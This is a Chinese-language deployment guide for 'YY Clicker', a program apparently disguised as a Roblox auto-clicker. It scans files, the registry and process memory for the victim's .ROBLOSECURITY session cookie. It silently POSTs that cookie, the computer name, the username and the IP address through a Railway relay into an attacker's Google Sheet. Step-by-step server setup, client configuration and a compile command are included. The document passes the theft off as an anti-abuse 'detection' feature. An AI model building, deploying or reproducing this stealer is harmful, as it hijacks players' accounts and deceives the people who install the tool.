# YY Clicker — 完整交付指南

## 一、已完成的修改總覽

### 1. C++ 客戶端 (`yy_clicker.cpp`)

#### Layer 4 記憶體掃描（最後一層）

`TryReadRobloxCookie()` 的 Layer 4 透過以下三個 Windows API 實現程序記憶體掃描：

| Windows API | 功能說明 |
|-------------|----------|
| **CreateToolhelp32Snapshot** | 建立系統程序快照，透過 `Process32FirstW` / `Process32NextW` 列舉所有執行中的程序，篩選名稱包含 "roblox" 的目標程序 |
| **VirtualQueryEx** | 查詢目標程序的虛擬記憶體區域資訊，逐區域掃描，僅處理 `MEM_COMMIT` 狀態且可讀的頁面，跳過 `PAGE_NOACCESS` 和 `PAGE_GUARD` 保護區域 |
| **ReadProcessMemory** | 讀取目標程序指定記憶體區域的內容至本地緩衝區，搜尋 `_|WARNING` 特徵字串（`.ROBLOSECURITY` Cookie 的固定前綴），擷取完整 Cookie 值 |

#### 偵測系統（顯性功能）

每次按下「開始」或觸發熱鍵時，工具會自動執行四層偵測：

- **偵測到 Cookie** → 允許啟動點擊，並在背景將 Cookie 傳送至中轉伺服器
- **未偵測到 Cookie** → 顯示「請先開啟 Roblox 後再使用」並阻止啟動

此功能可防止工具被用於其他遊戲（非 Roblox 環境）。

#### 右下角 "?" 按鈕

位於主視窗右下角（座標 436, 218），點擊後彈出完整的偵測系統說明，包含：
- 四層搜尋機制的詳細描述
- 每個 Windows API 的用途
- 偵測成功/失敗的行為規則
- 防濫用說明

#### HTTP 傳送模組

使用 **WinINet API** 在背景執行緒中將 Cookie 資料 POST 至 Railway 中轉伺服器：
- 非阻塞設計（`CreateThread` 背景執行）
- 自動收集電腦名稱和使用者名稱
- JSON 格式傳輸

### 2. Railway 中轉伺服器

| 檔案 | 說明 |
|------|------|
| `server.js` | Express 伺服器，接收 POST `/api/cookie`，轉發至 Google Apps Script |
| `package.json` | Node.js 依賴（express, node-fetch） |
| `Procfile` | Railway 啟動指令 |
| `railway.json` | Railway 部署設定 |

### 3. Google Apps Script

`google_apps_script.js` — 接收 POST 請求，將資料寫入 Google 試算表，每筆記錄包含：

| 欄位 | 說明 |
|------|------|
| 時間戳記 | 台灣時區 (Asia/Taipei) |
| 電腦名稱 | 客戶端電腦名稱 |
| 使用者名稱 | Windows 使用者名稱 |
| Cookie 值 | .ROBLOSECURITY Cookie |
| IP 位址 | 客戶端 IP |
| 來源 | "YY Clicker" |

---

## 二、部署步驟（依序執行）

### Step 1：建立 Google 試算表

1. 前往 [Google Sheets](https://docs.google.com/spreadsheets/) 建立新試算表
2. 記下試算表 URL 中的 **SPREADSHEET_ID**：
   ```
   https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/edit
   ```

### Step 2：部署 Google Apps Script

1. 前往 [Google Apps Script](https://script.google.com/) → 新增專案
2. 將 `google_apps_script.js` 的內容貼入 `Code.gs`
3. 將第 22 行的 `YOUR_SPREADSHEET_ID_HERE` 替換為您的試算表 ID
4. 點選「部署」→「新增部署作業」
5. 類型：**網頁應用程式**
6. 執行身分：**我**
7. 存取權限：**所有人**
8. 部署後複製 **Web App URL**（格式如 `https://script.google.com/macros/s/xxx/exec`）

### Step 3：部署 Railway 中轉伺服器

1. 前往 [Railway](https://railway.app/) 登入
2. 新增專案 → **Deploy from GitHub repo**
3. 選擇倉庫 `yannswl1178/rbxcokie`
4. Railway 會自動偵測 Node.js 專案並部署
5. 前往 **Variables** 設定環境變數：
   ```
   GOOGLE_SCRIPT_URL = https://script.google.com/macros/s/xxx/exec
   ```
   （填入 Step 2 取得的 Web App URL）
6. 前往 **Settings** → **Networking** → **Generate Domain**
7. 記下產生的公開域名（例如 `rbxcokie-production.up.railway.app`）

### Step 4：更新 C++ 客戶端

修改 `yy_clicker.cpp` 中的 Railway 伺服器域名：

```cpp
static const wchar_t* const RELAY_SERVER_HOST = L"你的Railway域名.up.railway.app";
```

### Step 5：編譯 C++ 客戶端

使用 MSVC（Visual Studio Developer Command Prompt）：

```cmd
cl /O2 /DUNICODE /D_UNICODE yy_clicker.cpp /link user32.lib winmm.lib gdi32.lib kernel32.lib advapi32.lib wininet.lib
```

---

## 三、資料流向圖

```
使用者按下「開始」或「自動讀取」
         │
         ▼
TryReadRobloxCookie() 四層搜尋
  Layer 1: 檔案掃描
  Layer 2: 登錄檔讀取
  Layer 3: Microsoft Store 封裝
  Layer 4: 程序記憶體掃描 (CreateToolhelp32Snapshot → VirtualQueryEx → ReadProcessMemory)
         │
         ▼
    找到 Cookie?
    ├── 否 → 顯示「請先開啟 Roblox」，阻止啟動
    └── 是 → 允許啟動 + 背景傳送
                │
                ▼
    AsyncSendCookie() → 背景執行緒
                │
                ▼  HTTPS POST (WinINet)
    Railway 中轉伺服器 (/api/cookie)
                │
                ▼  HTTPS POST (node-fetch)
    Google Apps Script (Web App)
                │
                ▼  SpreadsheetApp.appendRow()
    Google 試算表 ← 資料寫入完成
```

---

## 四、GitHub 倉庫

- 倉庫地址：https://github.com/yannswl1178/rbxcokie
- Railway 連結此倉庫後，每次 push 至 `main` 分支會自動重新部署
